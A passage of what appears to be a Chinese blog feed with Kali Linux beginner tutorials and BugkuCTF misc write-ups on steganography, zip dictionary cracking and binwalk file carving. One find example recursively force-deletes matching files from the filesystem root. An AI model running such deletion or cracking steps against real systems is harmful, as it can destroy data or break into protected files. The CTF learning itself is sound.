      <url>2020/11/20/kali/kali%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="基本守则"><a href="#基本守则" class="headerlink" title="基本守则"></a>基本守则</h2><p>（1）Linux系统大小写敏感</p><p>（2）文件名前带“.”是隐藏文件</p><p>（3）配置文件#开头代表是注释行，程序不执行改行</p><p>（4）Linux系统下的“/”相当于DOS下的“\”</p><p>（5）超级用户“#”，普通用户“$”</p><h2 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h2><p>将特殊字符转换成普通字符</p><p>（1）\        反斜杠，对单个字符进行转义</p><p>（2）’’        单引号，对一串字符进行转义</p><p>（3）``     反引号，可将命令二次处理</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="X-windows（图形化）与控制台（shell）间的切换"><a href="#X-windows（图形化）与控制台（shell）间的切换" class="headerlink" title="X-windows（图形化）与控制台（shell）间的切换"></a>X-windows（图形化）与控制台（shell）间的切换</h3><p>（1）X-windows切换到控制台：</p><pre><code>init 3</code></pre><p>或使用快捷键：Ctrl+alt+F3</p><p>（2）控制台切换到X-windows：</p><pre><code>startx或init 5</code></pre><h3 id="设置默认开机界面"><a href="#设置默认开机界面" class="headerlink" title="设置默认开机界面"></a>设置默认开机界面</h3><p>（1）查看当前系统默认开机界面</p><pre><code>systemctl get-default</code></pre><p>（2）设置开机默认为X-windows</p><pre><code>systemctl set-default graphical.target</code></pre><p>（3）设置开机默认为控制台</p><pre><code>systemclt set-default multi-user.target</code></pre><p>（4）命令可用tab键补全</p><h3 id="关机，重启，注销用户，锁屏，解锁"><a href="#关机，重启，注销用户，锁屏，解锁" class="headerlink" title="关机，重启，注销用户，锁屏，解锁"></a>关机，重启，注销用户，锁屏，解锁</h3><p>（1）关机，三种方式：</p><pre><code>shutdown -h nowhaltinit0</code></pre><p>（2）重启，三种方式：</p><pre><code>shutdown -r nowrebootinit 6</code></pre><p>（3）注销用户，退出登录</p><p>控制台界面下：</p><pre><code>exit    或快捷键Ctrl+D</code></pre><p>X-windows界面或shell下：</p><pre><code>pkill -kill -t tty7</code></pre><p>（4）锁屏，快捷键：Ctrl+s</p><p>（5）解锁，快捷键：Ctrl+q</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><table><thead><tr><th align="center">命令</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">history</td><td align="center">显示历史命令</td><td align="center">!5      //执行第5行的命令</td></tr><tr><td align="center">echo</td><td align="center">回显命令</td><td align="center"></td></tr><tr><td align="center">uname</td><td align="center">显示系统信息</td><td align="center">-a参数     //显示全部信息</td></tr><tr><td align="center">hostname</td><td align="center">显示主机名</td><td align="center"></td></tr><tr><td align="center">date</td><td align="center">显示或修改系统时间</td><td align="center">-s “20201120 12:12:00”</td></tr><tr><td align="center">cal</td><td align="center">显示日历</td><td align="center">cal 01 2020 //显示2020年1月的日历</td></tr><tr><td align="center">who、w</td><td align="center">查看登录用户信息</td><td align="center"></td></tr><tr><td align="center">whoami</td><td align="center">显示用户名</td><td align="center"></td></tr><tr><td align="center">which</td><td align="center">显示命令所在位置</td><td align="center"></td></tr><tr><td align="center">whereis</td><td align="center">显示文件位于系统中的什么位置</td><td align="center"></td></tr><tr><td align="center">whatis</td><td align="center">显示命令的简短描述</td><td align="center"></td></tr><tr><td align="center">命令 –help</td><td align="center">显示命令的使用摘要和参数列表</td><td align="center"></td></tr><tr><td align="center">man</td><td align="center">显示命令的说明文档</td><td align="center"></td></tr></tbody></table><p>ps：man命令：查看文档时，直接输入/keyword  即可在文档中搜索keyword这个关键字，n跳到下一个关键字，N跳到上一个关键字，键q离开说明文档</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table><thead><tr><th align="center">tab</th><th align="center">自动补全命令</th></tr></thead><tbody><tr><td align="center">Ctrl+a</td><td align="center">把光标移动到命令行最开始的地方</td></tr><tr><td align="center">Ctrl+e</td><td align="center">把光标移动到命令行末尾</td></tr><tr><td align="center">Ctrl+u</td><td align="center">删除当前光标前的所有内容</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali2020.1安装过程</title>
      <link href="2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/"/>
      <url>2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="准备资源"><a href="#准备资源" class="headerlink" title="准备资源"></a>准备资源</h2><p>（1）kali2020.1镜像，下载链接:<a href="https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso">https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso</a></p><p>（2）VMware</p><p>（3）良好的网络环境</p><p>（4）物理计算机至少有8G的内存，以保证在后续使用虚拟机时的流畅</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="新建一个虚拟机"><a href="#新建一个虚拟机" class="headerlink" title="新建一个虚拟机"></a>新建一个虚拟机</h3><p>（1）打开VMware，新建一个虚拟机</p><p><img src="https://i.loli.net/2020/11/18/5XWaNzcn7CAwHh9.png" alt="image-20201118194822750"></p><p>（2）会弹出两种安装方式，这里我选择自定义安装</p><p><img src="https://i.loli.net/2020/11/18/TSrnQKmefyx51MA.png" alt="image-20201118194943515"></p><p>（3）默认选择下一步，直到“安装客户机操作系统”，这里选择“稍后安装操作系统”</p><p><img src="https://i.loli.net/2020/11/18/4ipg25EmeGxB3wO.png" alt="image-20201118195206604"></p><p>（4）选择操作系统及其版本</p><p><img src="https://i.loli.net/2020/11/18/ShvCRwpOme84uQA.png" alt="image-20201118195449341"></p><p>（5）给虚拟机命名，并给其选择存放位置，这里建议在VMware目录下新建一个与虚拟机名称一样的文件夹，将虚拟机存在这个文件夹里。</p><p><img src="https://i.loli.net/2020/11/18/sFnwLfxpku4M2zt.png" alt="image-20201118195753952"></p><p>（6）配置处理器数量</p><p><img src="https://i.loli.net/2020/11/20/3sUfFGozpgAjuZC.png" alt="image-20201119125125453"></p><p>（7）为虚拟机分配内存，这里可以分配多一点，以便在后续的安装中更快</p><p><img src="https://i.loli.net/2020/11/18/Q8PkLYq3iTphnxO.png" alt="image-20201118200631782"></p><p>（8）网络类型选择NAT模式，桥接模式需要一个真实的IP，在校园里一般都是NAT模式。</p><p>（9）之后便一直默认下一步，直到为虚拟机分配磁盘容量，这里可自行定义</p><p><img src="https://i.loli.net/2020/11/18/XsACzh1xDS8IPla.png" alt="image-20201118200852936"></p><p>（10）默认下一步，直到“自定义硬件”，这里可以移除一些平时不用的硬件配置，比如USB控制器、声卡、打印机。点击“自定义硬件”即可在里面移除不用的硬件，然后点击完成。</p><p><img src="https://i.loli.net/2020/11/18/moWHl74GbhLCOsP.png" alt="image-20201118221327164"></p><p>（11）可看到已经创建好了一个虚拟机，此时便要用到下载好的镜像了。点击“CD/DVD(IDE)”,选择“使用ISO映像文件”，添加下载好的镜像，点击确定。</p><p><img src="https://i.loli.net/2020/11/18/LC2yNAH1boZ47pU.png" alt="image-20201118202005823"></p><p><img src="https://i.loli.net/2020/11/18/IDyEQuATq85SnWj.png" alt="image-20201118202118646"></p><h3 id="安装Kali"><a href="#安装Kali" class="headerlink" title="安装Kali"></a>安装Kali</h3><p>（1）点击开启虚拟机</p><p><img src="https://i.loli.net/2020/11/18/ASMQzZ1RUPepvkX.png" alt="image-20201118202451736"></p><p>（2）再出现的页面里选择Graphical install，回车，进行GUI界面安装</p><p><img src="https://i.loli.net/2020/11/18/NZmAzXrL3S2HdBe.png" alt="image-20201118202651265"></p><p>（3）选择一种语言，这里我选择English，选好后点击continue</p><p><img src="https://i.loli.net/2020/11/18/QpMaZgdkzuIHoXS.png" alt="image-20201118202755157"></p><p>（4）选择国家、领地或地区</p><p><img src="https://i.loli.net/2020/11/20/lbFrZzvmwgCDYnW.png" alt="image-20201120124026274"></p><p>（5）选择键盘映射</p><p><img src="https://i.loli.net/2020/11/20/2avsNCjpUz4xcBV.png" alt="image-20201120124328490"></p><p>（6）稍等1分钟。填写主机名</p><p><img src="https://i.loli.net/2020/11/18/S8ypjUHImC7Lgds.png" alt="image-20201118203301686"></p><p>（7）填写域名，这里可不填</p><p><img src="https://i.loli.net/2020/11/18/fTXeW3Q9rFk8UaR.png" alt="image-20201118203351174"></p><p>（8）设置一个用户名来取代root执行非管理任务的普通用户账号，因为2020版本的kali系统打破了传统默认是root的默认账号。</p><p><img src="https://i.loli.net/2020/11/18/wX2eKgRrWLMvyup.png" alt="image-20201118203930694"></p><p>（9）这里会填入上一步的用户名，可改可不改，这里是在登录界面用的用户名。</p><p><img src="https://i.loli.net/2020/11/18/G4vhds7uL6WtT2F.png" alt="image-20201118204113340"></p><p>（10）输入密码，二次输入确认密码</p><p><img src="https://i.loli.net/2020/11/18/sXLcI6UMtRElZAr.png" alt="image-20201118204212719"></p><p>（11）稍等1到两分钟，选择时区</p><p><img src="https://i.loli.net/2020/11/18/B8RTg3AunV29rSw.png" alt="image-20201118204421448"></p><p>（12）进入磁盘分区选项，点击continue</p><p><img src="https://i.loli.net/2020/11/18/x9GhY3UWQiA5kjH.png" alt="image-20201118204704353"></p><p>（13）默认并一直点击continue，直到最后一项，选择“yes”，将改动写入磁盘</p><p><img src="https://i.loli.net/2020/11/20/BLOSzmAFR7cdjpn.png" alt="image-20201120124504208"></p><p>（14）稍等1分钟，进入配置软件包管理器。这里若没有http代理信息，可忽略，点击continue</p><p><img src="https://i.loli.net/2020/11/20/Feq3szcvNxDMw2E.png" alt="image-20201120124628480"></p><p><img src="https://i.loli.net/2020/11/18/yO9kegB2uZ6CYtX.png" alt="image-20201118205218688"></p><p>（15）默认即可，continue</p><p><img src="https://i.loli.net/2020/11/18/DhuOtkTaMrH27Sy.png" alt="image-20201118215722620"></p><p>（16）之后便是“选择并安装软件”，这里需要一点时间，安装完成后，便是将GRUB安装至硬盘，选择“yes”</p><p><img src="https://i.loli.net/2020/11/20/BgtskKXzbRdjPa2.png" alt="image-20201120122137530"></p><p>（17）选择/dev/sda</p><p><img src="https://i.loli.net/2020/11/20/rXnxbWyJYhfejLq.png" alt="image-20201120122345533"></p><p>（18）安装完成</p><p><img src="https://i.loli.net/2020/11/20/wj8yP64sCcK9ndh.png" alt="image-20201120122609322"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali中的文件/目录操作</title>
      <link href="2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/16/kali/kali%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6-%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="文件操作常见命令"><a href="#文件操作常见命令" class="headerlink" title="文件操作常见命令"></a>文件操作常见命令</h2><p>以下内容都是基于kali2020.1版本的，在此列出命令的一些常见使用参数及用法，若要获取详细的使用方法，在命令后面加上 –help即可查看，或者使用man也可查看命令的帮助文档</p><pre><code>命令 --helpman 命令</code></pre><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><pre><code>cd dir             //进入一个目录dircd .               //验证&quot;.&quot;代表当前目录cd ..              //进入当前目录的上一级（cd ../.. 进入当前目录的上两级目录）cd -               //返回进入此目录之前所在的目录</code></pre><p><img src="https://i.loli.net/2020/11/17/QOJ7eMRVEADYHPC.png" alt="image-20201117193550828"></p><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h3><p>显示当前所在的工作目录</p><p><img src="https://i.loli.net/2020/11/17/ASpWwGgIdYsPHbq.png" alt="image-20201117193616793"></p><h3 id="ls-参数-对象-显示目录中的文件"><a href="#ls-参数-对象-显示目录中的文件" class="headerlink" title="ls [参数] [对象]       显示目录中的文件"></a>ls [参数] [对象]       显示目录中的文件</h3><pre><code>-a               //显示所有文件（包含隐藏文件）-l               //显示文件或目录的详细信息-lh              //将文件大小以K为单位显示-i               //显示文件或目录的indoes</code></pre><p>这里直接使用’ll’命令，其效果和’ls -l’一样，但初次使用’ll’会报错，系统会提示未找到该命令。</p><p>解决方法：</p><p>（1）编辑以下文档</p><pre><code>vim ~/.bashrc     //进入编辑模式</code></pre><p>（2）将alias ll=’ls -l‘前面的注释符号#删掉，保存并退出编辑</p><p>（3）重启即可</p><p><img src="https://i.loli.net/2020/11/17/ewixY9GIWPm8qLX.png" alt="image-20201117200316254"></p><h3 id="touch，vi-创建文件"><a href="#touch，vi-创建文件" class="headerlink" title="touch，vi     创建文件"></a>touch，vi     创建文件</h3><pre><code>touch file            //立即生成文件，若文件存在，则更新文件的时间戳vi file               //必须要保存才能生成相应的文件</code></pre><h3 id="mkdir-dir-创建目录"><a href="#mkdir-dir-创建目录" class="headerlink" title="mkdir  dir    创建目录"></a>mkdir  dir    创建目录</h3><h3 id="rmdir-删除空目录"><a href="#rmdir-删除空目录" class="headerlink" title="rmdir            删除空目录"></a>rmdir            删除空目录</h3><pre><code>rmdir dir           //只能删除空目录</code></pre><p>若要删除非空目录：</p><pre><code>rm -rf dir</code></pre><h3 id="cp-参数-sou-dst-复制文件或目录"><a href="#cp-参数-sou-dst-复制文件或目录" class="headerlink" title="cp [参数] sou dst     复制文件或目录"></a>cp [参数] sou dst     复制文件或目录</h3><pre><code>cp file1 file2 /dir          //若sou为文件，dst为目录，则可复制多个文件到该目录，但要加上目录所在路径cp file1 file2               //若sou和dst均为文件，则将file1的内容复制到file2中cp -r dir1 dir2              //若sou和dst均为目录，则将dir2复制到dir1中，需要加上参数-r  </code></pre><h3 id="mv-sou-dst-重命名、移动文件"><a href="#mv-sou-dst-重命名、移动文件" class="headerlink" title="mv sou dst      重命名、移动文件"></a>mv sou dst      重命名、移动文件</h3><pre><code>mv file1 file2             //若sou和dst均为文件，则将file1重命名为file2mv file dir                //若sou为文件，dst为目录，则将file移动到目录dir中，且可以移动多个文件</code></pre><h3 id="rm-参数-删除文件或目录"><a href="#rm-参数-删除文件或目录" class="headerlink" title="rm [参数]         删除文件或目录"></a>rm [参数]         删除文件或目录</h3><pre><code>-i                 //删除之前系统会进行一次确认-r                 //递归删除，用于删除目录-f                 //强制删除，没有提示和确认</code></pre><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><pre><code>file file_name     //显示文件类型等基本信息</code></pre><h3 id="ln-s-target-link-name-建立文件或目录链接"><a href="#ln-s-target-link-name-建立文件或目录链接" class="headerlink" title="ln [-s] target link_name         建立文件或目录链接"></a>ln [-s] target link_name         建立文件或目录链接</h3><p>（1）target最好指定为绝对路径，可使用pwd命令快速地获取路径，在后面加上需要链接的文件或目录即可</p><p>（2）建立的链接相当于windows中的快捷方式，但和target文件有不同的inodes。</p><p><img src="https://i.loli.net/2020/11/17/eIcms43GCbuO9YZ.png" alt="image-20201117210654615"></p><p><img src="https://i.loli.net/2020/11/17/L7PSbIX1kYcOMEH.png" alt="image-20201117210722443"></p><h3 id="find-path-expr-在路径path中查找符合表达式expr的文件"><a href="#find-path-expr-在路径path中查找符合表达式expr的文件" class="headerlink" title="find [path] [expr]              在路径path中查找符合表达式expr的文件"></a>find [path] [expr]              在路径path中查找符合表达式expr的文件</h3><p>（1）以下为表达式内容</p><pre><code>-name flag         //查找文件名符合flag的文件，-iname忽略大小写-empty             //查找空文件-user root         //查找在系统中属于root这个用户的文件-group root        //查找在系统中属于root这个组的文件-amin -n           //查找系统中最后n分钟被访问的文件-atime -n          //查找系统中最后n天被访问的文件</code></pre><p>（2）查找相关文件，并执行相关命令</p><pre><code>//将查找到的文件执行command操作-exc command &#123;&#125; \;          | xargs commandeg://删除查找到的文件名符合flag的文件find / -name flag -exec rm -rf &#123;&#125; \;         find / -name flag | xargs rm -rf</code></pre><p>{}表示find搜索出来的每个文件</p><p>{}和\之间有空格，命令的结尾必须是”;“不要忘记最后的分号</p><p>“|”为管道符，即把前一个命令的输出作为后一个命令的输入</p><h2 id="压缩，解压缩命令"><a href="#压缩，解压缩命令" class="headerlink" title="压缩，解压缩命令"></a>压缩，解压缩命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><pre><code>tar cvf file.tar dir    //打包目录中的文件，后面也可跟多个文件tar xvf file.tar        //解包#tar是打包，不是压缩</code></pre><h3 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h3><pre><code>gzip file           //压缩gunzip file.gz      //解压gzip -d file.gz     //解压</code></pre><h3 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h3><pre><code>tar zcvf file.tar.gz dir //压缩tar zxvf file.tar.gz     //解压</code></pre><h3 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h3><pre><code>bzip2 (-z) file      //压缩，有无参数z都可bunzip2 file.bz2     //解压bzip2 -d file.bz2    //解压</code></pre><h3 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title=".tar.bz2"></a>.tar.bz2</h3><pre><code>tar jcvf file.tar.bz2 dir   //压缩tar jxvf file.tar.bz2       //解压</code></pre><h3 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h3><pre><code>zip file.zip file/dir     //压缩文件或目录unzip file.zip            //解压</code></pre><h3 id="tgz"><a href="#tgz" class="headerlink" title=".tgz"></a>.tgz</h3><pre><code>tar zcvf file.tar.tgz file1 file2   //压缩tar zxvf file.tar.tgz      //解压</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali下root用户的配色问题</title>
      <link href="2020/11/15/kali/kali%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E8%89%B2%E9%97%AE%E9%A2%98/"/>
      <url>2020/11/15/kali/kali%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9A%84%E9%85%8D%E8%89%B2%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>（1）在该文件夹中粘贴颜色配置：vim /root/.bashrc</p><pre><code class="javascript">vim /root/.bashrc</code></pre><p>（2）粘贴内容如下：</p><pre><code class="javascript"># set variable identifying the chroot you work in (used in the prompt below)if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then    debian_chroot=$(cat /etc/debian_chroot)fi# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)case &quot;$TERM&quot; in    xterm-color) color_prompt=yes;;esac# uncomment for a colored prompt, if the terminal has the capability; turned# off by default to not distract the user: the focus in a terminal window# should be on the output of commands, not on the promptforce_color_prompt=yesif [ -n &quot;$force_color_prompt&quot; ]; then    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then    # We have color support; assume it&#39;s compliant with Ecma-48    # (ISO/IEC-6429). (Lack of such support is extremely rare, and such    # a case would tend to support setf rather than setaf.)    color_prompt=yes    else    color_prompt=    fifiif [ &quot;$color_prompt&quot; = yes ]; then    PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;else    PS1=&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#39;fiunset color_prompt force_color_prompt# If this is an xterm set the title to user@host:dircase &quot;$TERM&quot; inxterm*|rxvt*)    PS1=&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;    ;;*)    ;;esac# enable color support of ls and also add handy aliasesif [ -x /usr/bin/dircolors ]; then    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;    alias ls=&#39;ls --color=auto&#39;    #alias dir=&#39;dir --color=auto&#39;    #alias vdir=&#39;vdir --color=auto&#39;    #alias grep=&#39;grep --color=auto&#39;    #alias fgrep=&#39;fgrep --color=auto&#39;    #alias egrep=&#39;egrep --color=auto&#39;fi# some more ls aliases#alias ll=&#39;ls -l&#39;#alias la=&#39;ls -A&#39;#alias l=&#39;ls -CF&#39;# Alias definitions.# You may want to put all your additions into a separate file like# ~/.bash_aliases, instead of adding them here directly.# See /usr/share/doc/bash-doc/examples in the bash-doc package.if [ -f ~/.bash_aliases ]; then    . ~/.bash_aliasesfi# enable programmable completion features (you don&#39;t need to enable# this, if it&#39;s already enabled in /etc/bash.bashrc and /etc/profile# sources /etc/bash.bashrc).if ! shopt -oq posix; then  if [ -f /usr/share/bash-completion/bash_completion ]; then    . /usr/share/bash-completion/bash_completion  elif [ -f /etc/bash_completion ]; then    . /etc/bash_completion  fifi</code></pre><p>（3）执行命令source /root/.bashrc即可</p><pre><code class="javascript">source /root/.bashrc</code></pre><p>（4）配置前：</p><p><img src="https://i.loli.net/2020/11/15/kmhGaFQ2cq5uB7O.png" alt="image-20201115235207538"></p><p>（5）配置后：</p><p><img src="https://i.loli.net/2020/11/15/QBd9eWJRlyckqts.png" alt="image-20201115235233882"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装kali后修改系统时间</title>
      <link href="2020/11/15/kali/%E5%AE%89%E8%A3%85kali%E5%90%8E%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/"/>
      <url>2020/11/15/kali/%E5%AE%89%E8%A3%85kali%E5%90%8E%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p>（1）tzselect命令执行</p><pre><code>tzselect</code></pre><p><img src="https://i.loli.net/2020/11/15/obZ6UA8tWxnidGH.png" alt="image-20201115232743756"></p><p>（2）依次选择Asia - China - Beijing Time - Yes，只要输入选项前面的数字即可。</p><p><img src="https://i.loli.net/2020/11/15/QfUEhtYTjOB1GZp.png" alt="image-20201115233034860"></p><p>（3）修改配置文件，修改时区，输入以下命令</p><pre><code>echo &quot;ZONE=Asia/Shanghai&quot; &gt;&gt; /etc/sysconfigrm -f /etc/localtime             ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime    //链接到上海时区文件  </code></pre><p>（4）执行完毕后重启，即可看到系统修改时间已完成</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_006</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-006/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-006/</url>
      
        <content type="html"><![CDATA[<h2 id="听首音乐"><a href="#听首音乐" class="headerlink" title="听首音乐"></a>听首音乐</h2><p>（1）下载附件，是一个音频文件，用audacity工具打开<br><img src="https://img-blog.csdnimg.cn/20201114181337328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）波形图上有些东西，Ctrl+鼠标滚轮，放大，是莫尔斯电码<br><img src="https://img-blog.csdnimg.cn/20201114181702980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到….. -… -.-. —-. ..— ….. -…. ….- —-. -.-. -… —– .—- —.. —.. ..-. ….. ..— . -…. .—- –… -.. –… —– —-. ..— —-. .—- —-. .—- -.-.用在线工具解码，得到flag为5BC925649CB0188F52E617D70929191C，这里注意字母为大写，直接提交就可以。<br><img src="https://img-blog.csdnimg.cn/20201114181823245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> BugkuCTF_杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF_Misc_005</title>
      <link href="2020/11/15/BugkuCTF/BugkuCTF_Misc-005/"/>
      <url>2020/11/15/BugkuCTF/BugkuCTF_Misc-005/</url>
      
        <content type="html"><![CDATA[<h2 id="乌云邀请码"><a href="#乌云邀请码" class="headerlink" title="乌云邀请码"></a>乌云邀请码</h2><p>（1）下载附件，得到一张图片，notepad++打开，没有flag信息。再用stegsolve工具打开，发现plane0上面都有一串小黑点，选择Analyse 的Data Extract进行分析。<br><img src="https://img-blog.csdnimg.cn/20201104232409664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）勾选红绿蓝的0层，选择BGR模式，然后点击Preview，滚动条滑到最上，看到了flag。保存命名为1.txt，打开就是flag。<br><img src="https://img-blog.csdnimg.cn/20201104232714398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201104232725994.png#pic_center" alt="在这里插入图片描述"></p><h2 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h2><p>（1）下载附件，解压后还有一个压缩包。继续解压，但需要密码，直接暴力破解，破解不出来。换一个攻击类型，改为字典攻击，导入常用密码.txt，开始攻击。<br><img src="https://img-blog.csdnimg.cn/20201107181454181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201107181523294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）成功破解，密码为q1w2e3r4<br><img src="https://img-blog.csdnimg.cn/20201107181621538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）解压成功后，得到一个docx文档，打开没有发现flag。<br><img src="https://img-blog.csdnimg.cn/20201107181812554.png#pic_center" alt="在这里插入图片描述"></p><p>（4）不过下面那行的红色下划线有点奇怪，应该还有字，只是字体颜色为白色，改为黑色看看。<br><img src="https://img-blog.csdnimg.cn/20201107181953703.png#pic_center" alt="在这里插入图片描述"></p><p>（5）提交错误，再把该docx文档放到kali下binwalk一下，发现还有其他文件，用foremost进行分离文件。（也可以使用binwalk分离文件）</p><pre><code>#apt-get install binwalk        //安装binwalk#binwalk 文件名                  //查看是否存在隐藏文件#foremost -t all 文件名       //分离文件#binwalk -e 文件名             //分离文件</code></pre><p><img src="https://img-blog.csdnimg.cn/20201107182721882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）分解后，又是一个压缩包，解压后在docProps里发现falg.txt，里面是base64，解码后得到flag。<br><img src="https://img-blog.csdnimg.cn/20201107182828889.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201107182856236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="论剑"><a href="#论剑" class="headerlink" title="论剑"></a>论剑</h2><p>（1）下载附件，得到一张图片<br><img src="https://img-blog.csdnimg.cn/20201109190942602.png#pic_center" alt="在这里插入图片描述"></p><p>（2）放到kali下binwalk一下，发现有两张图片，用foremost分解，又是两张一样的图片。<br><img src="https://img-blog.csdnimg.cn/20201109191156780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（3）将得到的两张图片用stegsolve合成一下，没有发现信息。<br>（4）再用notepad++打开三张图片，查看图片尺寸是否一样<br>（5）发现新得到的两张图片尺寸不一样，将其修改为一样<br><img 